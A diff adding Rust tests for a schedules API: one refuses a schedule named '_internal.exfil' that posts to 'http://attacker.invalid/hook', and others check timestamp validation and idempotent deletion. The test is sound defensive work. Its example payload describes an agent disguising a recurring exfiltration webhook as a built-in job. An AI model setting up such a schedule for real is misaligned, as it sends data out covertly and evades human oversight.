@@ -299,6 +299,100 @@ async fn global_runs_feed_does_not_collide_with_id_route() {
 }
 
 #[tokio::test]
+async fn create_rejects_internal_prefix() {
+    // `_internal.*` is reserved for daemon-managed bootstrap rows.
+    // Direct creation over HTTP must 403, even with an otherwise valid
+    // body — agents with vault write access could otherwise mint a
+    // long-running schedule that looks like a built-in.
+    let app = router();
+    let body = serde_json::json!({
+        "name": "_internal.exfil",
+        "cron": "0 */2 * * *",
+        "target_url": "http://attacker.invalid/hook"
+    });
+    let resp = app
+        .oneshot(
+            Request::builder()
+                .method("POST")
+                .uri("/api/schedules")
+                .header("content-type", "application/json")
+                .body(Body::from(body.to_string()))
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
+    let json = body_json(resp).await;
+    assert!(
+        json["error"].as_str().unwrap_or("").contains("_internal"),
+        "error mentions the reserved prefix"
+    );
+}
+
+#[tokio::test]
+async fn delete_runs_before_rejects_non_rfc3339() {
+    let app = router();
+    let resp = app
+        .oneshot(
+            Request::builder()
+                .method("DELETE")
+                .uri("/api/schedules/runs?before=garbage")
+                .body(Body::empty())
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
+}
+
+#[tokio::test]
+async fn delete_runs_before_is_idempotent() {
+    let app = router();
+    // No rows exist; deleting "everything before now" is a no-op (deleted=0).
+    // A second call with the same `before` must also return 0 — proving
+    // idempotency at the route level.
+    let now = chrono::Utc::now().to_rfc3339();
+    let qs = format!(
+        "/api/schedules/runs?before={}",
+        urlencoding_test_helper(&now)
+    );
+    let r1 = app
+        .clone()
+        .oneshot(
+            Request::builder()
+                .method("DELETE")
+                .uri(&qs)
+                .body(Body::empty())
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    assert_eq!(r1.status(), StatusCode::OK);
+    let j1 = body_json(r1).await;
+    assert_eq!(j1["deleted"], 0);
+
+    let r2 = app
+        .oneshot(
+            Request::builder()
+                .method("DELETE")
+                .uri(&qs)
+                .body(Body::empty())
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    assert_eq!(r2.status(), StatusCode::OK);
+    let j2 = body_json(r2).await;
+    assert_eq!(j2["deleted"], 0);
+}
+
+/// Tiny URL-encoder limited to what the test needs (`+` and `:`).
+/// Keeps the test free of an extra dev-dep on `urlencoding`.
+fn urlencoding_test_helper(s: &str) -> String {
+    s.replace('+', "%2B").replace(':', "%3A")
+}
+
+#[tokio::test]
 async fn disable_clears_due_status() {
     let app = router();
     let body = serde_json::json!({
